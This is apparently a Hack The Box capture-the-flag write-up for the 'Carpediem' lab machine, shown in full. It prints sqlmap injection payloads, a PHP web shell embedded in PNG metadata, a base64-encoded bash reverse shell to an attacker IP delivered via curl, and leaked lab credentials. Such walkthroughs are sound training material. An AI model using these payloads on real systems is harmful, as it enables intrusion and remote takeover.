# Carpediem

## Summary

This is a hard box with many steps, but each step is relatively simple.

Nmap finds SSH and an Nginx web server on port `80`. The web server is just a countdown page so we scan for virtual hosts and find `portal.carpediem.htb`, which is a motorcycle store. We find LFI and SQLi attacks, but neither give us any useful information. There is also an admin page at `/admin`. We create an account and notice a strange parameter in the POST request that is sent when we edit our profile. Changing that parameter and then going to `/admin` gives us access to the admin portal. We can upload a profile picture, so we create a legitimate PNG image and then embed PHP code in the metadata of the image. This gives a reverse shell into a Docker container.

Inside the Docker container's web server files, we find credentials for the database that we could access before through SQLi. We also find an api key and a username for a service called [Trudesk](https://github.com/polonel/trudesk) at `trudesk.carpediem.htb`. Using the API and searching for vulnerabilities reveals nothing yet. Using LinPEAS, we find some other devices on the network, which are probably other Docker containers. So, we upload a static `nmap` binary and scan the local Docker network. Using [chisel](https://github.com/jpillora/chisel), we forward the port for each service to determine what they are. We find a [Backdrop CMS](https://backdropcms.org/) instance and a MongoDB server. The MongoDB server is unprotected and contains the Trudesk database. So, we look at the `users` collection and grab a different API key.

Using that API key we can view the tickets in Trudesk, which give us instructions and credentials for [Zoiper](https://www.zoiper.com/), a softphone to make VoIP calls. We sign in as a user and hear their voicemail, which contains their SSH password. On the box, we get the `user.txt` flag. LinPEAS alerts us that `/usr/sbin/tcpdump` can sniff all network traffic due to the capabilities it has. We capture traffic on the `docker0` network and find an SSL key at `/etc/ssl/certs/backdrop.carpediem.htb.key`. We decrypt the data in Wireshark with the SSL key, revealing a POST request with a username and password for the Backdrop CMS we found earlier.

We port forward and sign into Backdrop CMS. We are able to upload a malicious plugin and gain code execution, which gives us a reverse shell. We are in yet another Docker container as the `www-data` user. We notice that there is a script that runs as `root` every 10 seconds to make sure that the CMS is still running. The script will load the index page so we replace `index.php` with a reverse shell and get `root` on the container. We realize that we are running in a privileged container, so we [abuse linux cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) to give `/bin/bash` the SUID bit on the host. Then, we simply run `bash -p` on the host and get the `root.txt` flag.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.167 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.167`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)
|   256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)
|_  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Comming Soon
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Nginx (Port `80`)

![](screenshots/Screenshot%202022-07-30%20at%2014-15-37%20Comming%20Soon.png)

We see a reference to `Carpediem.htb`, so let's add that domain to `/etc/hosts`: `echo "10.10.11.167 carpediem.htb" | sudo tee -a /etc/hosts`. It brings us to the same website.

Bruteforcing for directories on `carpediem.htb` port `80` via `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://carpediem.htb/FUZZ`:

```
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 35ms]
                        [Status: 200, Size: 2875, Words: 714, Lines: 59, Duration: 38ms]
scripts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 30ms]
styles                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 29ms]
                        [Status: 200, Size: 2875, Words: 714, Lines: 59, Duration: 26ms]
:: Progress: [87651/87651] :: Job [1/1] :: 1452 req/sec :: Duration: [0:01:08] :: Errors: 0 ::
```

### Virtual Host Scanning

Now that we know the domain name, we can scan for other virtual hosts. Let's scan for subdomains with `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://carpediem.htb/ -H "Host: FUZZ.carpediem.htb" -fs 2875`:

```
portal                  [Status: 200, Size: 29024, Words: 7040, Lines: 443, Duration: 48ms]
:: Progress: [114441/114441] :: Job [1/1] :: 1250 req/sec :: Duration: [0:01:32] :: Errors: 0 ::
```

Let's add the newly discovered `portal` virtual host to `/etc/hosts`: `echo "10.10.11.167 portal.carpediem.htb" | sudo tee -a /etc/hosts`. It brings us to the same website.

### `portal.carpediem.htb`

![](screenshots/Screenshot%202022-07-30%20at%2014-23-47%20Motorcycle%20Store%20Portal.png)

Let's scan for directories with `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://portal.carpediem.htb/FUZZ`:

```
                        [Status: 200, Size: 29024, Words: 7040, Lines: 443, Duration: 47ms]
uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 32ms]
admin                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 30ms]
assets                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 27ms]
plugins                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 28ms]
classes                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 34ms]
dist                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 30ms]
inc                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 29ms]
build                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 30ms]
libs                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 28ms]
                        [Status: 200, Size: 29024, Words: 7040, Lines: 443, Duration: 40ms]
:: Progress: [87651/87651] :: Job [1/1] :: 1125 req/sec :: Duration: [0:01:20] :: Errors: 0 ::
```

There is an `uploads` directory that we cannot access (Forbidden). The `admin` page redirects to `http://portal.carpediem.htb/admin/login.php` and has a login form:

![](screenshots/Screenshot%202022-07-30%20at%2014-26-06%20Motorcycle%20Store%20Portal.png)

Trying a few common logins (`admin:admin`, etc.) doesn't work. We look at the login request in Firefox developer tools and run `sqlmap` with `sqlmap -u http://portal.carpediem.htb/classes/Login.php\?f\=login --data username=a\&password=a --random-agent --batch --level 3 --risk 2`, which finds no injections. Navigating directly to `http://portal.carpediem.htb/classes/Login.php` just says "Access Denied," so it's probably not worth bruteforcing files in the `classes/` directory.

The main `portal.carpediem.htb` site has a few features: it lists motorcycles we can rent, we can search for different bikes, and we can login to or create an account. In order to book a bike, you need to be logged in.

We can try some LFI on the `p` (page) parameter with `ffuf -ic -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://portal.carpediem.htb/\?p\=FUZZ -fs 17882`. For instance, going to `http://portal.carpediem.htb/?p=../../../../../../../../../../etc/passwd%00` shows this:

![](screenshots/Screenshot%202022-07-30%20at%2015-05-44%20Motorcycle%20Store%20Portal.png)

Eventually (after finding the right number of `../`), we can figure out that `http://portal.carpediem.htb/?p=../../../../var/www/html/portal/about` is the same thing as `http://portal.carpediem.htb/?p=about`.

Additionally, we try SQL injection on the `view_bike` page: `sqlmap -u http://portal.carpediem.htb/\?p\=view_bike\&id\=98f13708210194c475687be6106a3b84 --random-agent --batch`:

```
[15:08:40] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[15:08:41] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=c214041ad46...15904fad1b'). Do you want to use those [Y/n] Y
[15:08:41] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:08:41] [INFO] testing if the target URL content is stable
[15:08:41] [INFO] target URL content is stable
[15:08:41] [INFO] testing if GET parameter 'p' is dynamic
[15:08:42] [INFO] GET parameter 'p' appears to be dynamic
[15:08:42] [WARNING] heuristic (basic) test shows that GET parameter 'p' might not be injectable
[15:08:42] [INFO] testing for SQL injection on GET parameter 'p'
[15:08:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:08:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:08:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:08:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:08:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[15:08:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[15:08:44] [INFO] testing 'Generic inline queries'
[15:08:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:08:44] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[15:08:44] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[15:08:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:08:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:08:45] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[15:08:45] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[15:08:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[15:08:46] [WARNING] GET parameter 'p' does not seem to be injectable
[15:08:46] [INFO] testing if GET parameter 'id' is dynamic
[15:08:46] [INFO] GET parameter 'id' appears to be dynamic
[15:08:46] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[15:08:46] [INFO] testing for SQL injection on GET parameter 'id'
[15:08:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:08:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="V4")
[15:08:47] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[15:08:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[15:08:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[15:08:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[15:08:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[15:08:47] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[15:08:47] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[15:08:47] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[15:08:48] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[15:08:48] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:08:48] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:08:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:08:48] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:08:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:08:48] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[15:08:48] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:08:48] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[15:08:48] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[15:08:48] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[15:08:48] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[15:08:48] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[15:08:48] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[15:08:48] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[15:08:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[15:08:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[15:08:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[15:08:48] [INFO] testing 'Generic inline queries'
[15:08:48] [INFO] testing 'MySQL inline queries'
[15:08:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[15:08:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[15:08:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[15:08:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[15:08:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[15:08:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[15:08:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:08:59] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[15:08:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:08:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:08:59] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:08:59] [INFO] target URL appears to have 12 columns in query
[15:09:00] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 166 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=view_bike&id=98f13708210194c475687be6106a3b84' AND 8690=8690 AND 'rPUy'='rPUy

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=view_bike&id=98f13708210194c475687be6106a3b84' AND (SELECT 2500 FROM (SELECT(SLEEP(5)))uxmH) AND 'CRze'='CRze

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: p=view_bike&id=-9503' UNION ALL SELECT CONCAT(0x716b6a7671,0x63506c78724a457a424f5369625074486a4b45515a7864706576726a4442506e6e4e6d6977544246,0x716b7a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[15:09:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP, Nginx 1.18.0, PHP 7.4.25
back-end DBMS: MySQL >= 5.0.12
```

We append `--tables` to the `sqlmap` command and find this:

```
Database: portal
[7 tables]
+---------------------------------------+
| bike_list                             |
| brand_list                            |
| categories                            |
| file_list                             |
| rent_list                             |
| system_info                           |
| users                                 |
+---------------------------------------+
```

We can them dump the users table with `sqlmap -u http://portal.carpediem.htb/\?p\=view_bike\&id\=98f13708210194c475687be6106a3b84 --random-agent --batch -D portal -T users --dump`:

```
[15:11:53] [INFO] fetching columns for table 'users' in database 'portal'
[15:11:53] [INFO] fetching entries for table 'users' in database 'portal'
[15:11:53] [INFO] recognized possible password hashes in columns 'last_login, lastname, login_type'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[15:11:53] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[15:11:53] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[15:11:53] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[15:11:53] [INFO] starting 4 processes
[15:11:55] [INFO] cracked password 'amy' for hash '7771fbb20af6ef10827c593daa3aff7b'
[15:11:58] [INFO] cracked password 'test' for hash '098f6bcd4621d373cade4e832627b4f6'
[15:11:59] [INFO] cracked password 'test123' for hash 'cc03e747a6afbbcbf8be7668acfebee5'
Database: portal
Table: users
[5 entries]
+-------+-----------------------------------------+--------+--------------+------------------------+--------------------------------------------+----------+----------+-----------+---------------------+-----------------------------------------+-----------------------------------------+-------------------------------+
| id    | avatar                                  | gender | address      | contact                | lastname                                   | password | username | firstname | date_added          | last_login                              | login_type                              | date_updated                  |
+-------+-----------------------------------------+--------+--------------+------------------------+--------------------------------------------+----------+----------+-----------+---------------------+-----------------------------------------+-----------------------------------------+-------------------------------+
| 1     | uploads/1635793020_HONDA_XADV.png       | Male   | <blank>      | jhammond@carpediem.htb | 1                                          | admin    | <blank>  | Jeremy    | 2021-01-20 14:02:37 | Hammond                                 | b723e511b084ab84b44235d82da572f3        | 2022-04-01 23:34:50           |
| 25    | uploads/1659195060_Screenshot (222).png | Male   | test3        | 34234324234            | 1                                          | test4    | <blank>  | test2     | 2022-07-29 17:26:02 | test2                                   | 098f6bcd4621d373cade4e832627b4f6 (test) | 2022-07-30 15:31:57           |
| 1     | 37532984                                | test3  | test4        | 2022-07-29 19:25:37    | test5                                      | <blank>  | <blank>  | 26        | test2               | 098f6bcd4621d373cade4e832627b4f6 (test) | <blank>                                 | Male                          |
| hamdy | 12345678                                | 27     | TherernThere | 2022-07-30 14:55:07    | cc03e747a6afbbcbf8be7668acfebee5 (test123) | <blank>  | <blank>  | Male      | 2022-07-30 15:25:01 | 2                                       | <script>confirm(111)</script>           | <script>confirm(111)</script> |
| amy   | amy                                     | 28     | amy          | 2022-07-30 18:32:15    | 7771fbb20af6ef10827c593daa3aff7b (amy)     | <blank>  | <blank>  | Male      | 2022-07-30 18:43:51 | 1                                       | amy                                     | amy                           |
+-------+-----------------------------------------+--------+--------------+------------------------+--------------------------------------------+----------+----------+-----------+---------------------+-----------------------------------------+-----------------------------------------+-------------------------------+
```

The table above is the formatted correctly, but `b723e511b084ab84b44235d82da572f3` is probably the `admin`'s password hash. `sqlmap`'s built-in password hash cracking can't crack it and neither can [CrackStation](https://crackstation.net/).

Let's create an account:

![](screenshots/Screenshot%202022-07-30%20at%2014-30-40%20Motorcycle%20Store%20Portal.png)

We can now book a bike and it will show up on our account page at `http://portal.carpediem.htb/?p=my_account`:

![](screenshots/Screenshot%202022-07-30%20at%2014-39-29%20Motorcycle%20Store%20Portal.png)

Clicking on "Manage Account" in the top right let's us edit our registration details.

![](screenshots/Screenshot%202022-07-30%20at%2014-42-23%20Motorcycle%20Store%20Portal.png)

Clicking "Update" logs this request in burpsuite:

![](screenshots/Screenshot-20220730144132-1698x656.png)

There is a strange `login_type=2` parameter that was not part of the form. Let's set that to 1 instead and maybe we can elevate our privileges to an admin. After forwarding the request in burpsuite, we go to `http://portal.carpediem.htb/admin` and it loads successfully!

![](screenshots/Screenshot%202022-07-30%20at%2014-48-20%20Motorcycle%20Store%20Portal.png)

There are a few places we can upload files. However, The "Quarterly Report Upload" seems like a good spot since it says "NOTE: Upload functions still in development!" However, there doesn't appear to be any functionality to actually upload files on that page.

## Foothold

### Reverse Shell

If we go to our name in the top right and click "My Account" (`http://portal.carpediem.htb/admin/?page=user`), we get the ability to upload a profile picture:

![](screenshots/Screenshot%202022-07-30%20at%2014-54-38%20Motorcycle%20Store%20Portal.png)

Side note: Around this time I got logged out. Our login `amy:amy` doesn't work on `http://portal.carpediem.htb/admin/login.php` even though we are  an admin. We still need to sign in on `http://portal.carpediem.htb/` and then go to the admin page.

Generate a random PNG with `mx=256;my=256;head -c "$((3*mx*my))" /dev/urandom | convert -depth 8 -size "${mx}x${my}" RGB:- random.png` (command from [this StackExchange answer](https://unix.stackexchange.com/a/289670)). Then, use `exiftool` to embed some PHP code in the comment field: `exiftool -Comment="<?php echo 'Command:'; if(\$_POST){system(\$_POST['cmd']);} __halt_compiler();" random.png` (based on [command from HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-content-type-and-magic-number)). We can rename our image to `random.png.php` so the server will be able to execute our php code.

Uploading our new image works successfully! Now, just right click and open the image in a new tab. The URL will be something like `http://portal.carpediem.htb/uploads/1659209820_random.png.php`. Now, just use `curl` to post commands to the `cmd` parameter:

```
$ curl -X POST --data "cmd=ls" portal.carpediem.htb/uploads/1659209820_random.png.php --output -
PNG

IHD?1gAMA
         a cHRMz&u0`:pQ<bKGDtIME$qO%tEXtdate:create2022-07-30T19:36:15+00:00+\%tEXtdate:modify2022-07-30T19:36:15+00:00ZTtEXtCommentCommand:1
1635449220_1634087520_bike-img-1.jpg
1635449820_1634087520_bike-img-1.jpg
1635791700_HONDA_XADV.png
1635793020_HONDA_XADV.png
1659209460_test.php
1659209820_random.png.php
2
20
21
22
23
thumbnails
```

Now, let's get a reverse shell. Our reverse shell will be a standard `bash` reverse shell: `bash -i >& /dev/tcp/10.10.14.98/61991 0>&1`. Let's encode that in base64 by running `echo -n "bash -i >& /dev/tcp/10.10.14.98/61991 0>&1" | base64`, which gives us `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC82MTk5MSAwPiYx`. So, our payload should be `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC82MTk5MSAwPiYx | base64 -d | bash`. Let's url encode that to `echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC45OC82MTk5MSAwPiYx%20%7C%20base64%20-d%20%7C%20bash`. Start a listener with `pwncat-cs -lp 61991` and then run the reverse shell with `curl -X POST --data "cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC45OC82MTk5MSAwPiYx%20%7C%20base64%20-d%20%7C%20bash" http://portal.carpediem.htb/uploads/1659210360_random.png.php --output -`.

### Information Gathering (Foothold)

We are in a docker container due to the hostname and the presence of `.dockerenv` at `/`.

The [Docker Breakout / Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation) page on HackTricks mentions a great tool called [CDK](https://github.com/cdk-team/CDK#installationdelivery) for breaking out of Docker containers. We [download the program from GitHub](https://github.com/cdk-team/CDK/releases/), upload it using pwntools by running `upload Downloads/cdk_linux_amd64` in the local shell, and then run a full scan with `./cdk_linux_amd64 eva --full`. This doesn't find anything useful.

We can look in the directory for the `portal` site and see if we find anything interesting.

```
(remote) www-data@3c371615b7aa:/var/www/html/portal$ ls -ls | grep php
4 -rw-r--r-- 1 www-data www-data  233 Jun 22  2021 about.php
8 -rw-r--r-- 1 www-data www-data 4870 Oct 28  2021 bikes.php
8 -rw-r--r-- 1 www-data www-data 7002 Oct 13  2021 book_to_rent.php
4 -rw-r--r-- 1 www-data www-data 1708 Oct 29  2021 config.php
8 -rw-r--r-- 1 www-data www-data 5233 Oct 28  2021 edit_account.php
4 -rw-r--r-- 1 www-data www-data 2280 Oct 13  2021 home.php
4 -rw-r--r-- 1 root     root     2686 Apr  5 22:28 index.php
4 -rw-r--r-- 1 www-data www-data  667 Oct 28  2021 initialize.php
4 -rw-r--r-- 1 www-data www-data 2963 Oct 27  2021 login.php
4 -rw-r--r-- 1 www-data www-data   67 Jun 21  2021 logout.php
8 -rw-r--r-- 1 www-data www-data 4899 Oct 27  2021 my_account.php
8 -rw-r--r-- 1 www-data www-data 4564 Oct 27  2021 registration.php
4 -rw-r--r-- 1 www-data www-data  441 Oct 13  2021 success_booking.php
8 -rw-r--r-- 1 www-data www-data 5327 Oct 28  2021 view_bike.php
4 -rw-r--r-- 1 www-data www-data 3755 Oct 13  2021 view_categories.php

(remote) www-data@3c371615b7aa:/var/www/html/portal$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://portal.carpediem.htb/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"mysql");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"portaldb");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"J5tnqsXpyzkK4XNt");
if(!defined('DB_NAME')) define('DB_NAME',"portal");
?>
```

We get a username, `dev_oretnom`, and another password hash, `5da283a2d990e8d8512cf967df5bc0d0`, which [CrackStation](https://crackstation.net/) cannot crack. But, we do get credentials for the database: `portaldb:J5tnqsXpyzkK4XNt`. These probably are not helpful because we were already able to enumerate the database with `sqlmap` thanks to a SQL injection.

We can quickly scan the other files for passwords with `grep -B 2 -A 2 -rni password --include "*.php"`:

```
registration.php-51-                </div>
registration.php-52-                <div class="form-group">
registration.php:53:                    <label for="" class="control-label">Password</label>
registration.php:54:                    <input type="password" class="form-control form-control-sm form" name="password" required>
registration.php-55-                </div>
registration.php-56-                <div class="form-group d-flex justify-content-between">
--
registration.php-92-                        var _err_el = $('<div>')
registration.php-93-                            _err_el.addClass("alert alert-danger err-msg").text(resp.msg)
registration.php:94:                        $('[name="password"]').after(_err_el)
registration.php-95-                        end_loader()
registration.php-96-
--
classes/Users.php-16-           $data = '';
classes/Users.php-17-           foreach($_POST as $k => $v){
classes/Users.php:18:                   if(!in_array($k,array('password'))){
classes/Users.php-19-                           if(!empty($data)) $data .=" , ";
classes/Users.php-20-                           $data .= " {$k} = '{$v}' ";
classes/Users.php-21-                   }
classes/Users.php-22-           }
classes/Users.php:23:           if(!empty($password) && !empty($id)){
classes/Users.php:24:                   $password = md5($password);
classes/Users.php-25-                   if(!empty($data)) $data .=" , ";
classes/Users.php:26:                   $data .= " `password` = '{$password}' ";
classes/Users.php-27-           }
classes/Users.php-28-
--
classes/Login.php-19-           $_POST = sanitize_post($_POST);
classes/Login.php-20-           extract($_POST);
classes/Login.php:21:           $stmt = $this->conn->prepare("SELECT * from `users` where `username` = ? and `password` = ? and `id` = ?");
classes/Login.php-22-           $is_admin = 1;
classes/Login.php:23:           $stmt->bind_param("ssi",$username, md5($password), $is_admin);
classes/Login.php-24-           $stmt->execute();
classes/Login.php-25-           $rows = $stmt->get_result();
--
classes/Login.php-31-           return json_encode(array('status'=>'success'));
classes/Login.php-32-           }else{
classes/Login.php:33:           return json_encode(array('status'=>'incorrect','last_qry'=>"SELECT * from users where username = '$username' and password = md5('$password') and login_type = '1'"));
classes/Login.php-34-           }
classes/Login.php-35-   }
--
classes/Login.php-42-           $_POST = sanitize_post($_POST);
classes/Login.php-43-           extract($_POST);
classes/Login.php:44:           $stmt = $this->conn->prepare("SELECT * from `users` where `username` = ? and `password` = ?");
classes/Login.php:45:           $stmt->bind_param("ss",$username, md5($password));
classes/Login.php-46-           $stmt->execute();
classes/Login.php-47-           $rows = $stmt->get_result();
--
classes/Master.php-341-         $data = "";
classes/Master.php-342-         foreach($_POST as $k =>$v){
classes/Master.php:343:                 if(!in_array($k,array('id', 'password'))){
classes/Master.php-344-                         if(!empty($data)) $data .=",";
classes/Master.php-345-                         $data .= " `{$k}`='{$v}' ";
classes/Master.php-346-                 }
classes/Master.php-347-         }
classes/Master.php:348:         if(!empty($password)){
classes/Master.php:349:                 $data .= ", `password` = '".md5($password)."' ";
classes/Master.php-350-         }
classes/Master.php-351-         $stmt = $this->conn->prepare("SELECT * FROM `users` where `username` = ?");
--
classes/Master.php-405-         $data = "";
classes/Master.php-406-         foreach($_POST as $k =>$v){
classes/Master.php:407:                 if(!in_array($k,array('password'))){
classes/Master.php-408-                         if(!empty($data)) $data .=",";
classes/Master.php-409-                         $data .= " `{$k}`='{$v}' ";
classes/Master.php-410-                 }
classes/Master.php-411-         }
classes/Master.php:412:         if(!empty($password)){
classes/Master.php:413:                 $password = md5($password);
classes/Master.php-414-                 if(!empty($data)) $data .=" , ";
classes/Master.php:415:                 $data .= " `password` = '{$password}' ";
classes/Master.php-416-         }
classes/Master.php-417-         $stmt = $this->conn->prepare("SELECT * FROM `users` where `username` = ?");
--
classes/DBConnection.php-7-    private $host = 'mysql';
classes/DBConnection.php-8-    private $username = 'portaldb';
classes/DBConnection.php:9:    private $password = 'J5tnqsXpyzkK4XNt';
classes/DBConnection.php-10-    private $database = 'portal';
classes/DBConnection.php-11-
--
classes/DBConnection.php-16-        if (!isset($this->conn)) {
classes/DBConnection.php-17-
classes/DBConnection.php:18:            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
classes/DBConnection.php-19-
classes/DBConnection.php-20-            if (!$this->conn) {
--
classes/Trudesk.php-5-    private $apikey = 'f8691bd2d8d613ec89337b5cd5a98554f8fffcc4';
classes/Trudesk.php-6-    private $username = 'svc-portal-tickets';
